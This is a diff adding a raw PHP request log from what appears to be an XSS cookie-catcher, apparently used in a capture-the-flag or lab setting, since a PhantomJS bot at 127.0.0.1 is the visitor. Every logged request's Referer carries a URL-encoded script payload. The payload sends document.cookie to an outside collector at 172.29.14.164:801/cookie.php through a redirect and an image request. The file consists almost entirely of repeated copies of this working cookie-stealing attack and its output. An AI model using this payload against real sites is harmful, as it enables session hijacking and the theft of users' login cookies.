@@ -1,0 +1,204 @@
+
+2019-06-22 4:06:47
+Array
+(
+    [Get] => Array
+        (
+            [cookie] => 
+        )
+
+    [Post] => Array
+        (
+        )
+
+    [Cookie] => Array
+        (
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Referer] => http://127.0.0.1/bc8084a0c0be37b1f832c5568c171b67181818wiejdaf.php?x=%3Cscript%3E%0Adocument.location%3D%22http%3A%2F%2F172.29.14.164%3A801%2Fcookie.php%3Fcookie%3D%22%2Bdocument.cookie%3B%0Anew+Image%28%29.src%3D%22http%3A%2F%2F172.29.14.164%3A801%2Fcookie.php%3Fcookie%3D%22%2Bdocument.cookie%3B%0A%3C%2Fscript%3E%0D%0A
+            [User-Agent] => Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
+            [Connection] => Keep-Alive
+            [Accept-Encoding] => gzip, deflate
+            [Accept-Language] => en-US,*
+            [Host] => 172.29.14.164:801
+        )
+
+)
+
+2019-06-22 4:06:47
+Array
+(
+    [Get] => Array
+        (
+            [cookie] => 
+        )
+
+    [Post] => Array
+        (
+        )
+
+    [Cookie] => Array
+        (
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Referer] => http://127.0.0.1/bc8084a0c0be37b1f832c5568c171b67181818wiejdaf.php?x=%3Cscript%3E%0Adocument.location%3D%22http%3A%2F%2F172.29.14.164%3A801%2Fcookie.php%3Fcookie%3D%22%2Bdocument.cookie%3B%0Anew+Image%28%29.src%3D%22http%3A%2F%2F172.29.14.164%3A801%2Fcookie.php%3Fcookie%3D%22%2Bdocument.cookie%3B%0A%3C%2Fscript%3E%0D%0A
+            [User-Agent] => Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
+            [Connection] => Keep-Alive
+            [Accept-Encoding] => gzip, deflate
+            [Accept-Language] => en-US,*
+            [Host] => 172.29.14.164:801
+        )
+
+)
+
+*****linclog**********************************************************
+http://172.29.14.164:801/cookie.php?cookie=
+*****linclog**********************************************************
+2019-06-22 4:06:48
+Array
+(
+    [Get] => Array
+        (
+            [cookie] => 
+        )
+
+    [Post] => Array
+        (
+        )
+
+    [Cookie] => Array
+        (
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Referer] => http://127.0.0.1/bc8084a0c0be37b1f832c5568c171b67181818wiejdaf.php?x=%3Cscript%3E%0Adocument.location%3D%22http%3A%2F%2F172.29.14.164%3A801%2Fcookie.php%3Fcookie%3D%22%2Bdocument.cookie%3B%0Anew+Image%28%29.src%3D%22http%3A%2F%2F172.29.14.164%3A801%2Fcookie.php%3Fcookie%3D%22%2Bdocument.cookie%3B%0A%3C%2Fscript%3E%0D%0A
+            [User-Agent] => Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
+            [Connection] => Keep-Alive
+            [Accept-Encoding] => gzip, deflate
+            [Accept-Language] => en-US,*
+            [Host] => 172.29.14.164:801
+        )
+
+)
+
+http://172.29.14.164:801/cookie.php?cookie=
+*****linclog**********************************************************
+2019-06-22 4:06:49
+Array
+(
+    [Get] => Array
+        (
+            [cookie] => 
+        )
+
+    [Post] => Array
+        (
+        )
+
+    [Cookie] => Array
+        (
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Referer] => http://127.0.0.1/bc8084a0c0be37b1f832c5568c171b67181818wiejdaf.php?x=%3Cscript%3E%0Adocument.location%3D%22http%3A%2F%2F172.29.14.164%3A801%2Fcookie.php%3Fcookie%3D%22%2Bdocument.cookie%3B%0Anew+Image%28%29.src%3D%22http%3A%2F%2F172.29.14.164%3A801%2Fcookie.php%3Fcookie%3D%22%2Bdocument.cookie%3B%0A%3C%2Fscript%3E%0D%0A
+            [User-Agent] => Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
+            [Connection] => Keep-Alive
+            [Accept-Encoding] => gzip, deflate
+            [Accept-Language] => en-US,*
+            [Host] => 172.29.14.164:801
+        )
+
+)
+
+http://172.29.14.164:801/cookie.php?cookie=
+*****linclog**********************************************************
+2019-06-22 4:06:51
+Array
+(
+    [Get] => Array
+        (
+            [cookie] => 
+        )
+
+    [Post] => Array
+        (
+        )
+
+    [Cookie] => Array
+        (
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Referer] => http://127.0.0.1/bc8084a0c0be37b1f832c5568c171b67181818wiejdaf.php?x=%3Cscript%3E%0Adocument.location%3D%22http%3A%2F%2F172.29.14.164%3A801%2Fcookie.php%3Fcookie%3D%22%2Bdocument.cookie%3B%0Anew+Image%28%29.src%3D%22http%3A%2F%2F172.29.14.164%3A801%2Fcookie.php%3Fcookie%3D%22%2Bdocument.cookie%3B%0A%3C%2Fscript%3E%0D%0A
+            [User-Agent] => Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
+            [Connection] => Keep-Alive
+            [Accept-Encoding] => gzip, deflate
+            [Accept-Language] => en-US,*
+            [Host] => 172.29.14.164:801
+        )
+
+)
+
+http://172.29.14.164:801/cookie.php?cookie=
+2019-06-22 4:06:51
+Array
+(
+    [Get] => Array
+        (
+            [cookie] => 
+        )
+
+    [Post] => Array
+        (
+        )
+
+    [Cookie] => Array
+        (
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Referer] => http://127.0.0.1/bc8084a0c0be37b1f832c5568c171b67181818wiejdaf.php?x=%3Cscript%3E%0Adocument.location%3D%22http%3A%2F%2F172.29.14.164%3A801%2Fcookie.php%3Fcookie%3D%22%2Bdocument.cookie%3B%0Anew+Image%28%29.src%3D%22http%3A%2F%2F172.29.14.164%3A801%2Fcookie.php%3Fcookie%3D%22%2Bdocument.cookie%3B%0A%3C%2Fscript%3E%0D%0A
+            [User-Agent] => Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
+            [Connection] => Keep-Alive
+            [Accept-Encoding] => gzip, deflate
+            [Accept-Language] => en-US,*
+            [Host] => 172.29.14.164:801
+        )
+
+)
+
+*****linclog**********************************************************
+http://172.29.14.164:801/cookie.php?cookie=
+*****linclog**********************************************************
